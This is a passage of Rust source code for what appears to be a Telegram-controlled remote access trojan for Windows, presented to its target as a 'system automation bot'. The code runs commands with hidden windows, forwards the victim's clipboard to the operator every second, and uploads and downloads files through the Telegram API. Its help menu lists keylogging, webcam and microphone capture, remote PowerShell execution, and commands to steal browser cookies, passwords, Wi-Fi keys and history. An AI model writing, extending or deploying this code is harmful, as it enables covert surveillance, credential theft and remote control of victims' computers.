// WATCHDOG COMMANDS
// =============================================================================

async fn cmd_watchdog(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    match args.get(0).map(|s| *s) {
        Some("start") => {
            if start_watchdog().await {
                bot.send_message(msg.chat.id, "✅ Watchdog started").await?;
            } else {
                bot.send_message(msg.chat.id, "⚠️ Watchdog already running").await?;
            }
        }
        Some("stop") => {
            if stop_watchdog().await {
                bot.send_message(msg.chat.id, "✅ Watchdog stopped").await?;
            } else {
                bot.send_message(msg.chat.id, "⚠️ Watchdog not running").await?;
            }
        }
        Some("status") | None => {
            let status = get_watchdog_status().await;
            bot.send_message(msg.chat.id, status).await?;
        }
        Some("logs") => {
            let lines = args.get(1).and_then(|s| s.parse().ok()).unwrap_or(20);
            match get_watchdog_logs(lines).await {
                Ok(logs) => {
                    send_long_text(bot, msg.chat.id, &logs, "watchdog_logs.txt").await?;
                }
                Err(e) => {
                    bot.send_message(msg.chat.id, format!("❌ Error reading logs: {}", e)).await?;
                }
            }
        }
        Some("restart") => {
            stop_watchdog().await;
            sleep(Duration::from_millis(500)).await;
            if start_watchdog().await {
                bot.send_message(msg.chat.id, "🔄 Watchdog restarted").await?;
            } else {
                bot.send_message(msg.chat.id, "❌ Failed to restart watchdog").await?;
            }
        }
        _ => {
            bot.send_message(msg.chat.id, 
                "**🛠️ Watchdog Commands:**\n\n\
                `/wd start` - Start watchdog\n\
                `/wd stop` - Stop watchdog\n\
                `/wd restart` - Restart watchdog\n\
                `/wd status` - Show status\n\
                `/wd logs [n]` - Show last N log lines (default 20)\n\
                \nAliases: `/watchdog`, `/reanimator`")
                .await?;
        }
    }
    Ok(())
}

// =============================================================================
// ОСТАЛЬНЫЕ КОМАНДЫ
// =============================================================================

async fn send_long_text(bot: Bot, chat_id: ChatId, text: &str, filename: &str) -> Result<()> {
    if text.len() < 4000 {
        match bot.send_message(chat_id, text).await {
            Ok(_) => return Ok(()),
            Err(_) => {}
        }
    }
    
    let temp_path = std::env::temp_dir().join(filename);
    std_fs::write(&temp_path, text)?;
    
    let file = InputFile::file(&temp_path);
    bot.send_document(chat_id, file).await?;
    
    let _ = std_fs::remove_file(&temp_path);
    Ok(())
}

async fn init_monitors() -> Result<()> {
    tokio::spawn(async { system_monitor_task().await; });
    tokio::spawn(async { network_monitor_task().await; });
    tokio::spawn(async { file_monitor_task().await; });
    tokio::spawn(async { process_monitor_task().await; });
    tokio::spawn(async { registry_monitor_task().await; });
    tokio::spawn(async { clipboard_monitor_task().await; });
    tokio::spawn(async { power_monitor_task().await; });
    Ok(())
}

// =============================================================================
// ФУНКЦИИ МОНИТОРИНГА
// =============================================================================

async fn system_monitor_task() {
    let mut interval = tokio::time::interval(Duration::from_secs(5));
    loop {
        interval.tick().await;
        let mut monitor = SYSTEM_MONITOR.lock().await;
        monitor.update();
    }
}

async fn network_monitor_task() {
    let mut interval = tokio::time::interval(Duration::from_secs(10));
    loop {
        interval.tick().await;
        let mut monitor = NETWORK_MONITOR.lock().await;
        update_network_info(&mut monitor).await;
    }
}

async fn update_network_info(monitor: &mut NetworkMonitor) {
    if let Ok(interfaces) = network_interface::NetworkInterface::show() {
        for iface in interfaces {
            let ipv4 = iface.addrs.iter()
                .filter(|addr| matches!(addr.addr, std::net::IpAddr::V4(_)))
                .map(|addr| addr.addr.to_string())
                .collect();
            
            let ipv6 = iface.addrs.iter()
                .filter(|addr| matches!(addr.addr, std::net::IpAddr::V6(_)))
                .map(|addr| addr.addr.to_string())
                .collect();
            
            let info = InterfaceInfo {
                name: iface.name.clone(),
                mac: iface.mac_addr.as_ref().unwrap_or(&"".to_string()).clone(),
                ipv4,
                ipv6,
                status: if iface.is_up() { "Up".to_string() } else { "Down".to_string() },
            };
            monitor.interfaces.insert(info.name.clone(), info);
        }
    }
    
    if let Ok(connections) = get_network_connections() {
        monitor.connections = connections;
    }
}

fn get_network_connections() -> Result<Vec<ConnectionInfo>> {
    let mut connections = Vec::new();
    
    let args = ["-ano"];
    log_command("netstat", &args);
    let output = Command::new("netstat")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output()?;
    
    let output_str = String::from_utf8_lossy(&output.stdout);
    
    for line in output_str.lines() {
        if line.contains("TCP") || line.contains("UDP") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 5 {
                let connection = ConnectionInfo {
                    protocol: parts[0].to_string(),
                    local_addr: parts[1].to_string(),
                    remote_addr: parts[2].to_string(),
                    state: if parts.len() > 3 { parts[3].to_string() } else { "".to_string() },
                    pid: parts.last().unwrap().parse().unwrap_or(0),
                };
                connections.push(connection);
            }
        }
    }
    
    Ok(connections)
}

async fn file_monitor_task() {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    loop {
        interval.tick().await;
        let mut monitor = FILE_MONITOR.lock().await;
        scan_watched_directories(&mut monitor).await;
    }
}

async fn scan_watched_directories(monitor: &mut FileMonitor) {
    let watched = monitor.watched_dirs.clone();
    
    for dir in watched {
        if let Ok(mut entries) = fs::read_dir(&dir).await {
            while let Ok(Some(entry)) = entries.next_entry().await {
                if let Ok(metadata) = entry.metadata().await {
                    let path = entry.path();
                    if let Ok(modified) = metadata.modified() {
                        let modified: DateTime<Utc> = modified.into();
                        
                        if modified > monitor.last_scan {
                            let change = FileChange {
                                path,
                                change_type: ChangeType::Modified,
                                timestamp: Utc::now(),
                                size: metadata.len(),
                            };
                            monitor.changes.push(change);
                        }
                    }
                }
            }
        }
    }
    
    monitor.last_scan = Utc::now();
    
    if monitor.changes.len() > 1000 {
        monitor.changes.drain(0..monitor.changes.len() - 1000);
    }
}

async fn process_monitor_task() {
    let mut interval = tokio::time::interval(Duration::from_secs(2));
    loop {
        interval.tick().await;
        let mut monitor = PROCESS_MONITOR.lock().await;
        update_process_info(&mut monitor).await;
    }
}

async fn update_process_info(monitor: &mut ProcessMonitor) {
    let mut sys = System::new_all();
    sys.refresh_all();
    
    for (pid, process) in sys.processes() {
        let pid_u32 = pid.as_u32();
        let info = ProcessInfo {
            pid: pid_u32,
            name: process.name().to_string(),
            cpu_usage: process.cpu_usage(),
            memory_usage: process.memory(),
            threads: process.tasks().map(|t| t.len() as u32).unwrap_or_default(),
        };
        
        monitor.processes.insert(pid_u32, info);
        
        if process.cpu_usage() > 80.0 {
            let alert = ProcessAlert {
                pid: pid_u32,
                name: process.name().to_string(),
                severity: AlertSeverity::Warning,
                timestamp: Utc::now(),
                message: format!("High CPU usage: {:.1}%", process.cpu_usage()),
            };
            monitor.alerts.push(alert);
        }
    }
    
    if monitor.alerts.len() > 100 {
        monitor.alerts.drain(0..monitor.alerts.len() - 100);
    }
}

async fn registry_monitor_task() {
    let mut interval = tokio::time::interval(Duration::from_secs(60));
    loop {
        interval.tick().await;
        let mut monitor = REGISTRY_MONITOR.lock().await;
        check_registry_changes(&mut monitor).await;
    }
}

async fn check_registry_changes(monitor: &mut RegistryMonitor) {
    for key in &monitor.watched_keys.clone() {
        if let Ok(_) = registry::Registry::get(key) {
            let change = RegistryChange {
                key: key.clone(),
                change_type: RegistryChangeType::ValueSet,
                timestamp: Utc::now(),
            };
            monitor.changes.push(change);
        }
    }
    
    if monitor.changes.len() > 1000 {
        monitor.changes.drain(0..monitor.changes.len() - 1000);
    }
}

async fn clipboard_monitor_task() {
    let mut interval = tokio::time::interval(Duration::from_secs(1));
    loop {
        interval.tick().await;
        let mut monitor = CLIPBOARD_MONITOR.lock().await;
        
        if monitor.monitoring {
            if let Some(content) = monitor.check_clipboard() {
                let users = AUTHORIZED_USERS.read().await.clone();
                let bot = Bot::new(BOT_TOKEN.clone());
                
                for user_id in users {
                    let preview = if content.len() > 100 {
                        format!("{}...", &content[..100])
                    } else {
                        content.clone()
                    };
                    
                    let _ = bot.send_message(ChatId(user_id), 
                        format!("📋 **Clipboard Updated**\n\n{}", preview))
                        .await;
                }
            }
        }
    }
}

fn get_usb_devices() -> Result<Vec<UsbDevice>> {
    let mut devices = Vec::new();
    
    let args = ["-Command", "Get-WmiObject Win32_USBControllerDevice | ForEach-Object {[wmi]($_.Dependent)} | Select-Object Manufacturer,Name,DeviceID,Status"];
    log_command("powershell", &args);
    let output = Command::new("powershell")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output()?;
    
    let output_str = String::from_utf8_lossy(&output.stdout);
    
    for line in output_str.lines() {
        if line.contains("Manufacturer") {
            continue;
        }
        
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 3 {
            let device = UsbDevice {
                manufacturer: parts[0].to_string(),
                product: parts[1].to_string(),
            };
            devices.push(device);
        }
    }
    
    Ok(devices)
}

fn get_cameras() -> Result<Vec<CameraInfo>> {
    let mut cameras = Vec::new();
    
    let args = ["-Command", "Get-WmiObject Win32_PNPEntity | Where-Object {$_.Name -like '*camera*'} | Select-Object Name,Status"];
    log_command("powershell", &args);
    let output = Command::new("powershell")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output()?;
    
    let output_str = String::from_utf8_lossy(&output.stdout);
    
    for line in output_str.lines() {
        if line.contains("Name") {
            continue;
        }
        
        let parts: Vec<&str> = line.split_whitespace().collect();
        if !parts.is_empty() {
            let camera = CameraInfo {
                name: parts[0].to_string(),
                active: line.contains("OK"),
            };
            cameras.push(camera);
        }
    }
    
    Ok(cameras)
}

fn get_microphones() -> Result<Vec<MicrophoneInfo>> {
    let mut microphones = Vec::new();
    
    let host = cpal::default_host();
    
    for device in host.input_devices()? {
        if let Ok(name) = device.name() {
            let mic = MicrophoneInfo {
                name,
                active: true,
            };
            microphones.push(mic);
        }
    }
    
    Ok(microphones)
}

async fn power_monitor_task() {
    let mut interval = tokio::time::interval(Duration::from_secs(10));
    loop {
        interval.tick().await;
        let mut monitor = POWER_MONITOR.lock().await;
        update_power_info(&mut monitor).await;
    }
}

async fn update_power_info(monitor: &mut PowerMonitor) {
    if let Ok(info) = get_battery_info() {
        monitor.battery = Some(info);
    }
    
    monitor.power_source = get_power_source();
}

fn get_battery_info() -> Result<BatteryInfo> {
    let args = ["-Command", "Get-WmiObject Win32_Battery | Select-Object EstimatedChargeRemaining, BatteryStatus, DesignCapacity, FullChargeCapacity"];
    log_command("powershell", &args);
    let output = Command::new("powershell")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output()?;
    
    let output_str = String::from_utf8_lossy(&output.stdout);
    
    for line in output_str.lines() {
        if line.contains("EstimatedChargeRemaining") {
            continue;
        }
        
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 4 {
            let charge = parts[0].parse().unwrap_or(0.0);
            let status = match parts[1] {
                "2" => BatteryStatus::Charging,
                "1" => BatteryStatus::Discharging,
                "3" => BatteryStatus::Full,
                _ => BatteryStatus::Unknown,
            };
            let design = parts[2].parse::<f32>().unwrap_or(1.0);
            let full = parts[3].parse::<f32>().unwrap_or(0.0);
            let health = if design > 0.0 { (full / design) * 100.0 } else { 100.0 };
            
            let info = BatteryInfo {
                charge_percent: charge,
                health,
                status,
            };
            return Ok(info);
        }
    }
    
    Err(anyhow!("No battery found"))
}

fn get_power_source() -> PowerSource {
    let args = ["-Command", "(Get-WmiObject Win32_Battery).BatteryStatus"];
    log_command("powershell", &args);
    let output = Command::new("powershell")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output()
        .ok();
    
    if let Some(output) = output {
        let status = String::from_utf8_lossy(&output.stdout);
        if status.contains("2") {
            return PowerSource::AC;
        }
    }
    
    PowerSource::Battery
}

// =============================================================================
// РЕАЛИЗАЦИИ КОМАНД
// =============================================================================

async fn cmd_start(bot: Bot, msg: Message) -> Result<()> {
    bot.send_message(msg.chat.id, "👋 Hello! I'm a Windows system automation bot.\n\nUse /help for available commands.").await?;
    Ok(())
}

async fn cmd_help(bot: Bot, msg: Message) -> Result<()> {
    let help_text = r#"**📋 Доступные команды:**

**🛠️ Основные:**
/start - Приветствие
/help - Это сообщение
/auth <ключ> - Авторизация (ключ: B-ratInRust??)
/version - Версия бота
/stats - Статистика команд
/logs [n] - Показать последние n строк лога
/clear_logs - Очистить лог

**🔄 Watchdog (Реаниматор):**
/wd start - Запустить watchdog
/wd stop - Остановить watchdog
/wd restart - Перезапустить watchdog
/wd status - Статус watchdog
/wd logs [n] - Показать логи watchdog
Алиасы: /watchdog, /reanimator

**📁 Файлы:**
/download <путь> - Скачать файл
/download_url <url> [имя] - Скачать файл по URL
/upload <путь> - Загрузить файл (отправьте файл следом)
/list [путь] - Список файлов в директории
/list_recursive [путь] - Рекурсивный список
/create <имя> <текст> - Создать файл с текстом
/delete <путь> - Удалить файл/папку
/move <источник> <назначение> - Переместить
/rename <старое> <новое> - Переименовать
/hide <путь> - Скрыть файл/папку
/unhide <путь> - Показать скрытый
/file_properties <путь> - Свойства файла
/search_files <путь> <шаблон> - Поиск файлов
/checksum <файл> [алгоритм] - Вычислить хеш (md5,sha1,sha256,sha512)
/zip <источник> <архив.zip> - Создать ZIP
/unzip <архив.zip> <папка> - Распаковать ZIP

**⚙️ Система:**
/sysinfo - Информация о системе
/run <программа> [аргументы] - Запустить программу
/run_powershell <команда> - Выполнить PowerShell
/services - Список запущенных служб
/scheduled_tasks - Список задач планировщика
/registry get <ключ> - Чтение реестра
/registry set <ключ> <значение> - Запись в реестр
/registry delete <ключ> - Удалить ключ реестра
/autostart - Добавить в автозагрузку
/autostart_remove - Удалить из автозагрузки

**🖥️ Мониторинг:**
/monitor_system - Системная информация
/monitor_network - Сетевые интерфейсы и соединения
/monitor_processes - Топ процессов по CPU
/monitor_files [путь] - Начать слежение за папкой
/monitor_registry [ключ] - Слежение за реестром
/monitor_power - Статус питания и батареи
/alerts - Последние оповещения
/monitor [сек] - Мониторинг активного окна (по умолч. 30)

**📸 Захват:**
/screenshot [x y w h] - Сделать скриншот (можно область)
/screenshot_multi [кол-во] [задержка] - Несколько скриншотов
/camphoto - Фото с веб-камеры
/microfon [сек] - Запись с микрофона (до 30 сек)
/record_audio [сек] - То же, что /microfon

**⌨️ Клавиатура и мышь:**
/key_press <клавиша> - Нажать клавишу (enter, space, a, ...)
/type_text <текст> - Напечатать текст
/mouse_move <x> <y> - Переместить мышь
/mouse_click [left|right|middle] - Клик мышью
/mouse_position - Позиция курсора

**📋 Буфер обмена:**
/clipboard - Получить содержимое
/clipboard_set <текст> - Установить текст

**⌨️ Кейлоггер:**
/keylog_start - Запустить кейлоггер
/keylog_stop - Остановить
/keylog_dump - Выгрузить логи
/keylog_clear - Очистить логи
/keylog_status - Статус

**🔑 Кража данных:**
/steal_cookies - Найти файлы cookies браузеров
/steal_passwords - Найти файлы с паролями
/steal_wifi_passwords - Пароли от WiFi
/steal_history - История браузера (Chrome)
/steal_bookmarks - Закладки браузера (Chrome)

**💣 Управление ПК:**
/pcoff [сек] - Выключение (по умолч. 60)
/restart [сек] - Перезагрузка
/hibernate - Гибернация
/sleep - Сон
/lock - Блокировка
/logoff - Выход из системы
/abort_shutdown - Отменить выключение

**🎉 Развлечения:**
/rickroll - Rick Astley
/selfdestruct [сек] - Самоуничтожение бота

Отправьте команду без аргументов для справки по её использованию.
"#;
    send_long_text(bot, msg.chat.id, help_text, "help.txt").await?;
    Ok(())
}

async fn cmd_auth(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let key = args.join(" ");
    if key == *AUTH_KEY {
        let user_id = msg.from().map(|u| u.id.0).unwrap_or(0);
        AUTHORIZED_USERS.write().await.insert(user_id as i64);
        bot.send_message(msg.chat.id, "✅ Authorized").await?;
    } else {
        bot.send_message(msg.chat.id, "❌ Invalid key").await?;
    }
    Ok(())
}

async fn cmd_sysinfo(bot: Bot, msg: Message) -> Result<()> {
    let info = system::SystemInfo::get_system_info();
    bot.send_message(msg.chat.id, info).await?;
    Ok(())
}

async fn cmd_download(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /download <file>").await?;
        return Ok(());
    }
    
    let path = PathBuf::from(args.join(" "));
    
    if !path.exists() {
        bot.send_message(msg.chat.id, "❌ File not found").await?;
        return Ok(());
    }
    
    if path.is_dir() {
        bot.send_message(msg.chat.id, "❌ Cannot download directory. Use /zip first.").await?;
        return Ok(());
    }
    
    let size = path.metadata()?.len();
    
    if size > MAX_UPLOAD_SIZE {
        bot.send_message(msg.chat.id, format!("❌ File too large ({} MB). Max size: {} MB", 
            size / 1024 / 1024, MAX_UPLOAD_SIZE / 1024 / 1024)).await?;
        return Ok(());
    }
    
    bot.send_message(msg.chat.id, format!("📤 Uploading `{}` ({} MB)...", path.display(), size / 1024 / 1024)).await?;
    
    bot.send_document(msg.chat.id, InputFile::file(path)).await?;
    Ok(())
}

async fn cmd_download_url(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /download_url <url> [filename]").await?;
        return Ok(());
    }
    
    let url = args[0];
    let filename = args.get(1).map(|s| s.to_string()).unwrap_or_else(|| {
        url.split('/').last().unwrap_or("download").to_string()
    });
    
    bot.send_message(msg.chat.id, format!("📥 Downloading from `{}`...", url)).await?;
    
    let temp_dir = std::env::temp_dir();
    let path = temp_dir.join(&filename);
    
    let response = reqwest::get(url).await?;
    let bytes = response.bytes().await?;
    fs::write(&path, bytes).await?;
    
    let size = path.metadata()?.len();
    
    bot.send_message(msg.chat.id, format!("✅ Downloaded {} ({} MB)", filename, size / 1024 / 1024)).await?;
    bot.send_document(msg.chat.id, InputFile::file(&path)).await?;
    
    let _ = fs::remove_file(path).await;
    Ok(())
}

async fn cmd_upload(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /upload <destination_path>").await?;
        return Ok(());
    }
    
    let dst = PathBuf::from(args.join(" "));
    
    if let Some(parent) = dst.parent() {
        if !parent.as_os_str().is_empty() && !parent.exists() {
            if let Err(e) = fs::create_dir_all(&parent).await {
                bot.send_message(msg.chat.id, format!("❌ Cannot create directory: {}", e)).await?;
                return Ok(());
            }
        }
    }
    
    let mut queue = UPLOAD_QUEUE.lock().await;
    queue.retain(|(cid, _)| *cid != msg.chat.id);
    queue.push((msg.chat.id, dst));
    
    bot.send_message(msg.chat.id, "📤 Ready to receive file. Send me any file now.").await?;
    Ok(())
}

async fn handle_document(bot: Bot, msg: Message, doc: &teloxide::types::Document) -> Result<()> {
    let chat_id = msg.chat.id;
    let mut queue = UPLOAD_QUEUE.lock().await;
    
    if let Some(pos) = queue.iter().position(|(cid, _)| *cid == chat_id) {
        let (_, mut dst) = queue.remove(pos);
        drop(queue);

        bot.send_message(chat_id, format!("📥 Receiving `{}`...", doc.file_name.as_deref().unwrap_or("file"))).await?;

        if dst.is_dir() || dst.as_os_str().to_string_lossy().ends_with(std::path::MAIN_SEPARATOR) {
            if let Some(filename) = &doc.file_name {
                dst = dst.join(filename);
            } else {
                dst = dst.join(format!("file_{}", chrono::Local::now().timestamp()));
            }
        }

        let file = bot.get_file(doc.file.id.clone()).await?;
        
        let temp_dir = std::env::temp_dir();
        let temp_file = temp_dir.join(format!("upload_{}.tmp", Local::now().timestamp()));
        
        let file_path = &file.path;
        let url = format!("https://api.telegram.org/file/bot{}/{}", BOT_TOKEN.as_str(), file_path);
        let file_bytes = reqwest::get(&url).await?.bytes().await?;
        fs::write(&temp_file, file_bytes).await?;

        match fs::copy(&temp_file, &dst).await {
            Ok(_) => {
                let size = dst.metadata()?.len();
                fs::remove_file(temp_file).await?;
                bot.send_message(chat_id, format!("✅ File uploaded to `{}` ({} MB)", dst.display(), size / 1024 / 1024)).await?;
            }
            Err(e) => {
                let _ = fs::remove_file(temp_file).await;
                bot.send_message(chat_id, format!("❌ Upload error: {}", e)).await?;
            }
        }
    }
    
    Ok(())
}

async fn handle_photo(bot: Bot, msg: Message) -> Result<()> {
    let chat_id = msg.chat.id;
    if let Some(photo) = msg.photo() {
        if let Some(photo_size) = photo.last() {
            let file_id = photo_size.file.id.clone();
            let file = bot.get_file(file_id).await?;
            
            let mut queue = UPLOAD_QUEUE.lock().await;
            
            let mut dst = if let Some(pos) = queue.iter().position(|(cid, _)| *cid == chat_id) {
                let (_, dest) = queue.remove(pos);
                dest
            } else {
                dirs::picture_dir().unwrap_or_else(|| PathBuf::from("."))
                    .join(format!("photo_{}.jpg", Local::now().timestamp()))
            };
            drop(queue);
            
            if dst.is_dir() || dst.as_os_str().to_string_lossy().ends_with(std::path::MAIN_SEPARATOR) {
                dst = dst.join(format!("photo_{}.jpg", Local::now().timestamp()));
            }
            
            let temp_dir = std::env::temp_dir();
            let temp_file = temp_dir.join(format!("photo_{}.tmp", Local::now().timestamp()));
            
            let file_path = &file.path;
            let url = format!("https://api.telegram.org/file/bot{}/{}", BOT_TOKEN.as_str(), file_path);
            let file_bytes = reqwest::get(&url).await?.bytes().await?;
            fs::write(&temp_file, file_bytes).await?;

            match fs::copy(&temp_file, &dst).await {
                Ok(_) => {
                    fs::remove_file(temp_file).await?;
                    bot.send_message(chat_id, format!("✅ Photo saved to `{}`", dst.display())).await?;
                }
                Err(e) => {
                    let _ = fs::remove_file(temp_file).await;
                    bot.send_message(chat_id, format!("❌ Photo upload error: {}", e)).await?;
                }
            }
        }
    }
    Ok(())
}

async fn cmd_list(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let dir = if args.is_empty() {
        PathBuf::from(".")
    } else {
        PathBuf::from(args.join(" "))
    };
    
    if !dir.exists() {
        bot.send_message(msg.chat.id, "❌ Directory not found").await?;
        return Ok(());
    }
    
    let listing = system::list_directory(&dir).await?;
    send_long_text(bot, msg.chat.id, &listing, "listing.txt").await?;
    Ok(())
}

async fn cmd_list_recursive(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let dir = if args.is_empty() {
        PathBuf::from(".")
    } else {
        PathBuf::from(args.join(" "))
    };
    
    if !dir.exists() {
        bot.send_message(msg.chat.id, "❌ Directory not found").await?;
        return Ok(());
    }
    
    bot.send_message(msg.chat.id, format!("🔍 Scanning `{}`...", dir.display())).await?;
    
    let mut entries = Vec::new();
    
    for entry in WalkDir::new(&dir).into_iter().filter_map(|e| e.ok()).take(1000) {
        let path = entry.path();
        let metadata = entry.metadata().ok();
        let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);
        entries.push(format!("{} [{}] {}", 
            if path.is_dir() { "📁" } else { "📄" },
            size,
            path.strip_prefix(&dir).unwrap_or(path).display()
        ));
    }
    
    let listing = entries.join("\n");
    send_long_text(bot, msg.chat.id, &listing, "recursive_listing.txt").await?;
    Ok(())
}

async fn cmd_create(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.len() < 2 {
        bot.send_message(msg.chat.id, "Usage: /create <name> <text>").await?;
        return Ok(());
    }
    
    let name = args[0];
    let text = args[1..].join(" ");
    
    fs::write(name, text).await?;
    bot.send_message(msg.chat.id, format!("✅ Created: `{}`", name)).await?;
    Ok(())
}

async fn cmd_delete(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /delete <path>").await?;
        return Ok(());
    }
    
    let path = PathBuf::from(args.join(" "));
    
    if !path.exists() {
        bot.send_message(msg.chat.id, "❌ Path not found").await?;
        return Ok(());
    }
    
    if path.is_dir() {
        fs::remove_dir_all(&path).await?;
        bot.send_message(msg.chat.id, format!("✅ Deleted directory: `{}`", path.display())).await?;
    } else {
        fs::remove_file(&path).await?;
        bot.send_message(msg.chat.id, format!("✅ Deleted file: `{}`", path.display())).await?;
    }
    
    Ok(())
}

async fn cmd_move(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.len() < 2 {
        bot.send_message(msg.chat.id, "Usage: /move <src> <dst>").await?;
        return Ok(());
    }
    
    let src = PathBuf::from(args[0]);
    let dst = PathBuf::from(args[1]);
    
    if !src.exists() {
        bot.send_message(msg.chat.id, "❌ Source not found").await?;
        return Ok(());
    }
    
    fs::rename(&src, &dst).await?;
    bot.send_message(msg.chat.id, format!("✅ Moved `{}` → `{}`", src.display(), dst.display())).await?;
    Ok(())
}

async fn cmd_rename(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.len() < 2 {
        bot.send_message(msg.chat.id, "Usage: /rename <old> <new>").await?;
        return Ok(());
    }
    
    let old = PathBuf::from(args[0]);
    let new = PathBuf::from(args[1]);
    
    if !old.exists() {
        bot.send_message(msg.chat.id, "❌ File not found").await?;
        return Ok(());
    }
    
    fs::rename(&old, &new).await?;
    bot.send_message(msg.chat.id, format!("✅ Renamed `{}` → `{}`", old.display(), new.display())).await?;
    Ok(())
}

async fn cmd_hide(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /hide <path>").await?;
        return Ok(());
    }
    
    let path = PathBuf::from(args.join(" "));
    
    if !path.exists() {
        bot.send_message(msg.chat.id, "❌ Path not found").await?;
        return Ok(());
    }
    
    match file_utils::hide_file(&path) {
        Ok(_) => {
            bot.send_message(msg.chat.id, format!("✅ Hidden: `{}`", path.display())).await?;
        }
        Err(e) => {
            bot.send_message(msg.chat.id, format!("❌ Failed to hide: {}", e)).await?;
        }
    }
    
    Ok(())
}

async fn cmd_unhide(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /unhide <path>").await?;
        return Ok(());
    }
    
    let path = PathBuf::from(args.join(" "));
    
    if !path.exists() {
        bot.send_message(msg.chat.id, "❌ Path not found").await?;
        return Ok(());
    }
    
    match file_utils::unhide_file(&path) {
        Ok(_) => {
            bot.send_message(msg.chat.id, format!("✅ Unhidden: `{}`", path.display())).await?;
        }
        Err(e) => {
            bot.send_message(msg.chat.id, format!("❌ Failed to unhide: {}", e)).await?;
        }
    }
    
    Ok(())
}

async fn cmd_file_properties(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /properties <path>").await?;
        return Ok(());
    }
    
    let path = PathBuf::from(args.join(" "));
    
    if !path.exists() {
        bot.send_message(msg.chat.id, "❌ Path not found").await?;
        return Ok(());
    }
    
    let metadata = path.metadata()?;
    let created = metadata.created().ok().map(|t| {
        let dt: DateTime<Utc> = t.into();
        dt.format("%Y-%m-%d %H:%M:%S").to_string()
    }).unwrap_or_else(|| "Unknown".to_string());
    
    let modified = metadata.modified().ok().map(|t| {
        let dt: DateTime<Utc> = t.into();
        dt.format("%Y-%m-%d %H:%M:%S").to_string()
    }).unwrap_or_else(|| "Unknown".to_string());
    
    let accessed = metadata.accessed().ok().map(|t| {
        let dt: DateTime<Utc> = t.into();
        dt.format("%Y-%m-%d %H:%M:%S").to_string()
    }).unwrap_or_else(|| "Unknown".to_string());
    
    let info = format!(
        "**📄 File Properties**\n\nPath: `{}`\n\nType: {}\nSize: {} bytes ({} MB)\nCreated: {}\nModified: {}\nAccessed: {}\nHidden: {}",
        path.display(),
        if path.is_dir() { "Directory" } else { "File" },
        metadata.len(),
        metadata.len() / 1024 / 1024,
        created,
        modified,
        accessed,
        if is_hidden(&path)? { "Yes" } else { "No" }
    );
    
    bot.send_message(msg.chat.id, info)
        .parse_mode(ParseMode::MarkdownV2)
        .await?;
    Ok(())
}

fn is_hidden(path: &Path) -> Result<bool> {
    use std::os::windows::fs::MetadataExt;
    let metadata = std::fs::metadata(path)?;
    Ok((metadata.file_attributes() & 0x2) != 0)
}

async fn cmd_search_files(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.len() < 2 {
        bot.send_message(msg.chat.id, "Usage: /search <path> <pattern>").await?;
        return Ok(());
    }
    
    let search_path = PathBuf::from(args[0]);
    let pattern = args[1..].join(" ");
    
    if !search_path.exists() {
        bot.send_message(msg.chat.id, "❌ Path not found").await?;
        return Ok(());
    }
    
    bot.send_message(msg.chat.id, format!("🔍 Searching for `{}` in `{}`...", pattern, search_path.display())).await?;
    
    let mut results = Vec::new();
    let pattern_lower = pattern.to_lowercase();
    
    for entry in WalkDir::new(&search_path).into_iter().filter_map(|e| e.ok()).take(1000) {
        let path = entry.path();
        if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
            if name.to_lowercase().contains(&pattern_lower) {
                results.push(path.display().to_string());
            }
        }
    }
    
    if results.is_empty() {
        bot.send_message(msg.chat.id, "❌ No files found").await?;
    } else {
        let output = results.join("\n");
        send_long_text(bot, msg.chat.id, &output, "search_results.txt").await?;
    }
    
    Ok(())
}

async fn cmd_checksum(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /checksum <file> [algorithm]\nAlgorithms: md5, sha1, sha256, sha512").await?;
        return Ok(());
    }
    
    let file_path = PathBuf::from(args[0]);
    let algorithm = args.get(1).unwrap_or(&"sha256").to_lowercase();
    
    if !file_path.exists() {
        bot.send_message(msg.chat.id, "❌ File not found").await?;
        return Ok(());
    }
    
    bot.send_message(msg.chat.id, format!("🔐 Calculating {}...", algorithm)).await?;
    
    let data = fs::read(&file_path).await?;
    let hash = match algorithm.as_str() {
        "md5" => {
            let digest = md5::compute(&data);
